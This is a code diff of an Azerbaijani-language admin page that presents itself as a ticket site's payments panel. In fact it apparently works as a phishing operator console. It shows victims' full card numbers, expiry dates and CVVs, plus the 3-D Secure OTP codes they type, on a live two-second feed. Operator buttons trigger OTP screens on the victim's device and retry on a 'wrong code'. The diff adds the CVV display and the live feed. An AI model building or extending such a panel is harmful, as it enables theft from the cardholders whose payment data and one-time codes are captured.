@@ -1,10 +1,10 @@
-<!-- Admin Ödəniş Panel - Sadələşdirilmiş -->
 <section class="section">
   <div class="container">
     <div class="section__head">
       <div>
         <div class="eyebrow"><%= t('nav.panel') %></div>
         <h1><%= t('admin.payments') %></h1>
+        <p class="sec-note">Məlumatlar canlı yenilənir — səhifəni yeniləməyə ehtiyac yoxdur.</p>
       </div>
     </div>
 
@@ -14,220 +14,191 @@
       <div>
         <div class="card mb-24"><div class="card__body">
           <div class="timetable-tabs">
-            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən (<%= pending %>)</a>
+            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən (<span data-pending-count><%= pending %></span>)</a>
             <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved">Təsdiqlənmiş</a>
-            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd Edilmiş</a>
+            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd edilmiş</a>
+            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all">Hamısı</a>
           </div>
-          <div id="payNote" class="hidden alert mb-0"></div>
+          <div class="flex-between mt-16">
+            <span class="sec-note mb-0"><span class="live-dot"></span> Canlı · son yenilənmə: <span data-live-at>—</span></span>
+          </div>
+          <div id="payNote" class="hidden alert mb-0 mt-16"></div>
         </div></div>
 
-        <% if (!payments.length) { %>
-          <div class="card"><div class="card__body"><p class="sec-note mb-0">Ödəniş yoxdur</p></div></div>
-        <% } %>
-
-        <% payments.forEach(function(p){ %>
-          <% var o = orderMap[String(p.order)] || null; %>
-          <% var u = userMap[String(p.user)] || null; %>
-          <div class="card mb-16">
-            <div class="card__head">
-              <span class="mono"><%= p.transactionId %></span>
-              <span class="badge <%= p.status === 'approved' ? 'badge--green' : (p.status === 'declined' ? 'badge--red' : 'badge--gold') %>"><%= p.status %></span>
-            </div>
-            <div class="card__body">
-              
-              <!-- KART MƏLUMATLAR -->
-              <div class="grid grid--2 mb-20">
-                <div>
-                  <h4 style="font-size:0.9rem;margin:0 0 12px 0;font-weight:600">🔐 Kart Məlumatları</h4>
-                  <dl class="kv">
-                    <dt>Kart</dt><dd class="mono"><%= p.card && p.card.number ? String(p.card.number).replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim() : '—' %></dd>
-                    <dt>Sahibi</dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
-                    <dt>Son Tarix</dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
-                    <dt>Brand</dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
-                    <dt>Məbləğ</dt><dd class="mono" style="font-size:1.1rem"><strong><%= p.amount.toFixed(2) %> ₼</strong></dd>
-                  </dl>
-                </div>
-
-                <div>
-                  <h4 style="font-size:0.9rem;margin:0 0 12px 0;font-weight:600">👤 Sifarış / Müştəri</h4>
-                  <dl class="kv">
-                    <dt>Müştəri</dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
-                    <dt>Email</dt><dd><%= u ? u.email : '—' %></dd>
-                    <dt>Telefon</dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
-                    <dt>Sifarış</dt><dd class="mono"><%= o ? o.orderNo : '(Balans)' %></dd>
-                    <dt>Reysi</dt><dd><%= o ? (o.fromName + ' → ' + o.toName) : '—' %></dd>
-                  </dl>
-                </div>
-              </div>
-
-              <!-- OTP KODLAR -->
-              <% if (p.verificationCode || p.submittedCode) { %>
-                <div style="background:#f5f5f5;padding:12px;border-radius:4px;margin-bottom:16px">
-                  <h4 style="font-size:0.9rem;margin:0 0 8px 0;font-weight:600">🔐 OTP Kodlar</h4>
-                  <% if (p.submittedCode) { %>
-                    <div style="margin-bottom:8px">
-                      <span style="color:#666;font-size:0.9rem">✅ İstifadəçi daxil etdi:</span>
-                      <span class="mono" style="font-size:1.3rem;letter-spacing:0.15em;font-weight:bold"><%= p.submittedCode %></span>
-                      <% if (p.codeSubmittedAt) { %>
-                        <div style="font-size:0.85rem;color:#999;margin-top:2px"><%= new Date(p.codeSubmittedAt).toLocaleTimeString('az-AZ', { timeZone: 'Asia/Baku' }) %></div>
-                      <% } %>
-                    </div>
-                  <% } %>
-                  <% if (p.verificationCode) { %>
-                    <div>
-                      <span style="color:#666;font-size:0.9rem">✓ Sistem yaratdı:</span>
-                      <span class="mono" style="font-size:1.3rem;letter-spacing:0.15em;font-weight:bold;color:#0084ff"><%= p.verificationCode %></span>
-                      <% if (p.rejectionCount > 0) { %>
-                        <span style="font-size:0.85rem;color:#f57c00;margin-left:8px">(Yeniləndi <%= p.rejectionCount %> dəfə)</span>
-                      <% } %>
-                    </div>
-                  <% } %>
-                </div>
-              <% } %>
-
-              <!-- ADMIN SEÇIM DÜĞMƏLƏR -->
-              <% if (p.status === 'code_submitted' && p.submittedCode) { %>
-                <div class="alert alert--info mb-16">
-                  <strong>🔔 Müştəri OTP daxil etdi!</strong><br>
-                  <% if (p.submittedCode === p.verificationCode) { %>
-                    Kod DOĞRUDUR - Bilet veriş üçün hazırdır ✅
-                  <% } else { %>
-                    Kod SEHVDİR - Yenidən cəhd etdirmə imkanı var
-                  <% } %>
-                </div>
-
-                <div style="display:flex;gap:8px">
-                  <button class="btn btn--primary btn--lg" data-approve-final="<%= p._id %>" style="flex:1">
-                    ✅ Təsdiq Et (Bilet ver)
-                  </button>
-                  <button class="btn btn--warning btn--lg" data-reject-otp="<%= p._id %>" style="flex:1">
-                    ❌ Səhv Kod
-                  </button>
-                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
-                    🚫 Rədd Et
-                  </button>
-                </div>
-              <% } else if (p.stage === 'card_review' && p.status === 'pending_admin') { %>
-                <div class="alert alert--info mb-16">
-                  <strong>💳 Yeni kart məlumatı daxil oldu</strong><br>
-                  Təsdiq etdikdə istifadəçinin ekranında DƏRHAL OTP ekranı açılacaq.
-                </div>
-                <div style="display:flex;gap:8px">
-                  <button class="btn btn--primary btn--lg" data-approve-card="<%= p._id %>" style="flex:1">
-                    ✅ Təsdiq Et (OTP ekranını aç)
-                  </button>
-                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
-                    🚫 Rədd Et
-                  </button>
-                </div>
-              <% } else if (p.stage === 'wrong_code') { %>
-                <div class="alert alert--warning mb-16">
-                  <strong>⏱️ Səhv OTP — istifadəçidə 2 dəq geri sayım gedir</strong><br>
-                  Geri sayım bitdikdə yeni OTP ekranı avtomatik açılacaq<% if (p.rejectionCount) { %> (Səhv kod: <%= p.rejectionCount %> dəfə)<% } %>.
-                </div>
-                <div style="display:flex;gap:8px">
-                  <button class="btn btn--primary btn--lg" data-open-otp="<%= p._id %>" style="flex:1">
-                    🔄 Yeni OTP ekranını indi aç
-                  </button>
-                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
-                    🚫 Rədd Et
-                  </button>
-                </div>
-              <% } else if (p.stage === 'otp_entry' && p.status === 'awaiting_3ds') { %>
-                <div class="alert alert--warning">
-                  🔐 İstifadəçi OTP kodunu daxil edir...
-                </div>
-              <% } else if (p.status === 'approved') { %>
-                <div class="alert alert--success">
-                  <strong>✅ Təsdiqlənmiş</strong><br>
-                  <% if (p.adminFinalApprovedAt) { %>
-                    <%= new Date(p.adminFinalApprovedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %>
-                  <% } %>
-                </div>
-              <% } else if (p.status === 'declined') { %>
-                <div class="alert alert--danger">
-                  <strong>❌ Rədd Edilmiş</strong><br>
-                  <%= p.declinedReason || 'Səbəb göstərilmədi' %>
-                </div>
-              <% } else { %>
-                <div class="alert alert--warning">
-                  Ödəniş gözlümə mərhələsində...
-                </div>
-              <% } %>
-
-            </div>
-          </div>
-        <% }) %>
+        <div id="payList" data-feed-url="/api/admin/payments/feed?status=<%= status %>"></div>
       </div>
     </div>
   </div>
 </section>
 
+<style>
+  .live-dot { display:inline-block;width:8px;height:8px;border-radius:50%;background:#19a974;margin-right:6px;
+    animation: livePulse 1.4s ease-in-out infinite; }
+  @keyframes livePulse { 0%,100%{opacity:1} 50%{opacity:.25} }
+  .pay-card { border:1px solid var(--line); border-radius:12px; background:#fff; margin-bottom:16px; overflow:hidden; }
+  .pay-card__head { display:flex; justify-content:space-between; align-items:center; gap:10px;
+    padding:12px 16px; background:#f7f9fc; border-bottom:1px solid var(--line); flex-wrap:wrap; }
+  .pay-card__body { padding:16px; }
+  .pay-grid { display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:18px; }
+  @media (max-width:760px){ .pay-grid { grid-template-columns:1fr; } }
+  .pay-box { background:#f7f9fc; border-radius:10px; padding:12px 14px; }
+  .pay-box h4 { font-size:.85rem; margin:0 0 10px; font-weight:700; }
+  .pay-row { display:flex; justify-content:space-between; gap:12px; font-size:.86rem; padding:3px 0; }
+  .pay-row span:first-child { color:var(--ink-3); }
+  .pay-pan { font-family:Consolas,monospace; font-size:1.15rem; letter-spacing:.06em; font-weight:700; }
+  .otp-big { font-family:Consolas,monospace; font-size:1.6rem; letter-spacing:.25em; font-weight:700; color:#00539b; }
+  .stage-chip { font-size:.75rem; font-weight:700; padding:4px 10px; border-radius:999px; }
+  .stage-card_review { background:#fff5e0; color:#8a6414; }
+  .stage-otp_entry { background:#e6f0fb; color:#00539b; }
+  .stage-otp_review { background:#fdf1d6; color:#8a6414; }
+  .stage-wrong_code { background:#fdecea; color:#a12b26; }
+  .stage-done { background:#e8f7ef; color:#14724a; }
+  .pay-actions { display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
+</style>
+
 <script>
 (function () {
-  var note = document.getElementById('payNote');
-  
-  function show(msg, ok) {
-    if (!note) return;
-    note.classList.remove('hidden');
-    note.className = 'alert ' + (ok ? 'alert--success' : 'alert--danger');
-    note.textContent = msg;
-    note.scrollIntoView({ behavior: 'smooth' });
-  }
-  
-  async function call(url) {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json',
-        'X-Requested-With': 'XMLHttpRequest'
-      },
-      body: JSON.stringify({})
+  'use strict';
+  var list = document.getElementById('payList');
+  if (!list) return;
+  var feedUrl = list.getAttribute('data-feed-url');
+  var noteBox = document.getElementById('payNote');
+  var busy = false;
+
+  var STAGE_LABEL = {
+    card_review: 'Kart təsdiqi gözlənilir',
+    otp_entry: 'İstifadəçi OTP yazır',
+    otp_review: 'OTP kodu gəldi — təsdiq gözlənilir',
+    wrong_code: 'Səhv kod — geri sayım',
+    done: 'Tamamlandı'
+  };
+
+  function esc(v) {
+    return String(v == null ? '' : v).replace(/[&<>"']/g, function (c) {
+      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
     });
-    return res.json();
   }
 
-  document.addEventListener('click', async function (e) {
-    const btn = e.target.closest('[data-approve-card], [data-open-otp], [data-approve-final], [data-reject-otp], [data-decline]');
-    if (!btn) return;
-    
-    e.preventDefault();
-    btn.disabled = true;
-    
-    let url = '';
-    if (btn.hasAttribute('data-approve-card')) {
-      url = '/api/admin/payments/' + btn.getAttribute('data-approve-card') + '/approve-card';
-    } else if (btn.hasAttribute('data-open-otp')) {
-      url = '/api/admin/payments/' + btn.getAttribute('data-open-otp') + '/open-otp';
-    } else if (btn.hasAttribute('data-approve-final')) {
-      url = '/api/admin/payments/' + btn.getAttribute('data-approve-final') + '/approve-final';
-    } else if (btn.hasAttribute('data-reject-otp')) {
-      url = '/api/admin/payments/' + btn.getAttribute('data-reject-otp') + '/reject-otp';
-    } else if (btn.hasAttribute('data-decline')) {
-      url = '/api/admin/payments/' + btn.getAttribute('data-decline') + '/decline';
-    }
+  function note(msg, kind) {
+    noteBox.className = 'alert alert--' + kind + ' mb-0 mt-16';
+    noteBox.textContent = msg;
+    noteBox.classList.remove('hidden');
+  }
 
-    try {
-      const data = await call(url);
-      show(data.message || (data.ok ? 'Tamamlandı' : 'Xəta'), !!data.ok);
-      if (data.ok) {
-        setTimeout(() => { window.location.reload(); }, 1200);
-      } else {
-        btn.disabled = false;
-      }
-    } catch (err) {
-      show('Şəbəkə xətası', false);
-      btn.disabled = false;
+  function mmss(s) {
+    s = Math.max(0, Number(s) || 0);
+    var m = Math.floor(s / 60), r = s % 60;
+    return m + ':' + (r < 10 ? '0' : '') + r;
+  }
+
+  function actions(p) {
+    var out = '';
+    if (p.stage === 'card_review') {
+      out += '<button class="btn btn--primary" data-act="approve-card" data-id="' + p.id + '">Kartı təsdiqlə — OTP ekranını aç</button>';
     }
+    if (p.stage === 'wrong_code') {
+      out += '<button class="btn btn--primary" data-act="open-otp" data-id="' + p.id + '">OTP ekranını indi aç</button>';
+    }
+    if (p.stage === 'otp_review') {
+      out += '<button class="btn btn--primary" data-act="approve" data-id="' + p.id + '">Bilet ver</button>';
+      out += '<button class="btn btn--gold" data-act="reject-otp" data-id="' + p.id + '">Səhv kod</button>';
+    }
+    if (p.stage !== 'done') {
+      out += '<button class="btn btn--danger" data-act="decline" data-id="' + p.id + '">Ödənişi rədd et</button>';
+    }
+    return out;
+  }
+
+  function render(rows) {
+    if (!rows.length) {
+      list.innerHTML = '<div class="card"><div class="card__body"><p class="sec-note mb-0">Hazırda ödəniş yoxdur.</p></div></div>';
+      return;
+    }
+    list.innerHTML = rows.map(function (p) {
+      var o = p.order || {};
+      var u = p.user || {};
+      return '' +
+      '<div class="pay-card" data-row="' + p.id + '">' +
+        '<div class="pay-card__head">' +
+          '<span class="mono">' + esc(p.transactionId) + '</span>' +
+          '<span class="stage-chip stage-' + esc(p.stage) + '">' + esc(STAGE_LABEL[p.stage] || p.stage) + '</span>' +
+          '<span class="mono">⏱ ' + mmss(p.secondsLeft) + '</span>' +
+          '<strong>' + Number(p.amount).toFixed(2) + ' ₼</strong>' +
+        '</div>' +
+        '<div class="pay-card__body">' +
+          '<div class="pay-grid">' +
+            '<div class="pay-box">' +
+              '<h4>Kart məlumatları</h4>' +
+              '<div class="pay-pan">' + esc(p.card.number || p.card.masked || '—') + '</div>' +
+              '<div class="pay-row"><span>Sahibi</span><span>' + esc(p.card.holder || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Son tarix</span><span class="mono">' + esc(p.card.expiry || '—') + '</span></div>' +
+              '<div class="pay-row"><span>CVV</span><span class="mono">' + esc(p.card.cvv || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Növ</span><span>' + esc((p.card.brand || '—').toUpperCase()) + '</span></div>' +
+              '<div class="pay-row"><span>Kart mənbəyi</span><span>' + (p.usingSavedCard ? 'Yadda saxlanılmış kart' : 'Yeni kart') + '</span></div>' +
+            '</div>' +
+            '<div class="pay-box">' +
+              '<h4>Müştəri / sifariş</h4>' +
+              '<div class="pay-row"><span>Ad</span><span>' + esc(u.name || '—') + '</span></div>' +
+              '<div class="pay-row"><span>E-poçt</span><span>' + esc(u.email || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Telefon</span><span>' + esc(u.phone || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Sifariş</span><span class="mono">' + esc(o.orderNo || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Marşrut</span><span>' + esc(o.route || '—') + '</span></div>' +
+              '<div class="pay-row"><span>Tarix</span><span>' + esc(o.date || '—') + '</span></div>' +
+            '</div>' +
+          '</div>' +
+          (p.submittedCode
+            ? '<div class="pay-box mt-16"><h4>İstifadəçinin yazdığı 3-D OTP kodu</h4><div class="otp-big">' + esc(p.submittedCode) + '</div></div>'
+            : '') +
+          (p.codeAttempts && p.codeAttempts.length > 1
+            ? '<div class="pay-box mt-16"><h4>Əvvəlki cəhdlər</h4>' + p.codeAttempts.slice(0, -1).map(function (c) {
+                return '<div class="pay-row"><span class="mono">' + esc(c.code) + '</span><span>' + new Date(c.at).toLocaleTimeString('az-AZ') + '</span></div>';
+              }).join('') + '</div>'
+            : '') +
+          '<div class="pay-actions">' + actions(p) + '</div>' +
+        '</div>' +
+      '</div>';
+    }).join('');
+  }
+
+  async function load() {
+    if (busy) return;
+    try {
+      var res = await fetch(feedUrl, { headers: { 'X-Requested-With': 'XMLHttpRequest' }, credentials: 'same-origin' });
+      var d = await res.json();
+      if (!d.ok) return;
+      render(d.rows);
+      var pc = document.querySelector('[data-pending-count]');
+      if (pc) pc.textContent = d.pending;
+      var at = document.querySelector('[data-live-at]');
+      if (at) at.textContent = new Date(d.at).toLocaleTimeString('az-AZ');
+    } catch (e) { /* növbəti sorğuda davam edir */ }
+  }
+
+  list.addEventListener('click', async function (ev) {
+    var btn = ev.target.closest('[data-act]');
+    if (!btn) return;
+    var act = btn.getAttribute('data-act');
+    var id = btn.getAttribute('data-id');
+    var body = {};
+    if (act === 'decline') {
+      var reason = window.prompt('Rədd səbəbi:', 'Kart doğrulanmadı');
+      if (reason === null) return;
+      body.reason = reason;
+    }
+    busy = true;
+    btn.disabled = true;
+    var r = await fetch('/api/admin/payments/' + id + '/' + act, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
+      credentials: 'same-origin',
+      body: JSON.stringify(body)
+    }).then(function (x) { return x.json(); }).catch(function () { return { ok: false, message: 'Şəbəkə xətası' }; });
+    busy = false;
+    note(r.message || (r.ok ? 'Yerinə yetirildi' : 'Əməliyyat alınmadı'), r.ok ? 'success' : 'error');
+    load();
   });
 
-  // Auto-refresh pending tab
-  if ('<%= status %>' === 'pending') {
-    setInterval(() => {
-      if (!document.querySelector('button:disabled')) {
-        window.location.reload();
-      }
-    }, 8000);
-  }
+  load();
+  setInterval(load, 2000);
 })();
 </script>
